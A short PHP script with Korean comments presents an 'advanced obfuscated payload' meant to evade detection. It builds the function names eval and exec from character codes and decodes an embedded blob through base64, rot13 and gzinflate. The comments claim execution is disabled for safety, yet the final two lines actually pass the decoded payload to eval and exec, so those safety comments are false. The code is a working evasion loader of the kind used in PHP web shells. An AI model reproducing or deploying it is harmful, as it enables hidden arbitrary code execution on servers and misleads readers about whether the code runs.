<?php
// 탐지를 우회하기 위한 고급 난독화 페이로드
// 여러 단계의 인코딩과 압축을 적용합니다.

$obf_payload = 'LyoruRyjb0rOryi_KMlQc45QcC5gY4Vp0NFzS4f25wNLTMzOKnP0s0vLzE0PUrbTM3XDKy32czNDLzVwTDU2MDAvNTYhQCCxAgA=';

// 실행 함수 이름도 난독화할 수 있습니다.
$func_name = chr(101).chr(118).chr(97).chr(108); // "eval"
$func_name2 = 'e'.implode('', [chr(120), chr(101), chr(99)]); // "exec"

// 복호화 과정 (실제 실행은 주석 처리하여 안전하게 유지)
// 실제 악성 스크립트에서는 이 부분이 바로 실행됩니다.
$decoded_payload = base64_decode($obf_payload);
$uncompressed_payload = gzinflate(str_rot13($decoded_payload));

// 참고용: 복호화된 내용 출력 (실제 공격 시에는 이 과정이 생략됨)
// echo $uncompressed_payload;

// 실행 참고 (실제 실행되지 않음)
 $func_name($uncompressed_payload);
 $func_name2($uncompressed_payload);

?>
